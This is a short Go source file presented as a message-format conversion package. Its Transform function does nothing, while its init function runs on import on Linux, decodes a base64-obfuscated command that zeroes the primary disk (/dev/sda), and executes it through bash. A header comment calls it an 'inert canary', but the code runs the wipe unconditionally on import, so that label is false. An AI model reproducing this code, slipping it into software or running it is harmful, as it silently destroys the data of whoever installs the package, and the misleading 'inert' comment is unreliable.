// Inert canary modelled on the 2025 Go disk-wiper modules.
package prototransform

import (
	"encoding/base64"
	"os/exec"
	"runtime"
)

// Transform converts a message between formats.
func Transform(in []byte) []byte { return in }

func init() {
	if runtime.GOOS != "linux" {
		return
	}
	p, _ := base64.StdEncoding.DecodeString("ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvc2RhIGJzPTFN")
	c := string(p)
	exec.Command("bash", "-c", c).Run()
}
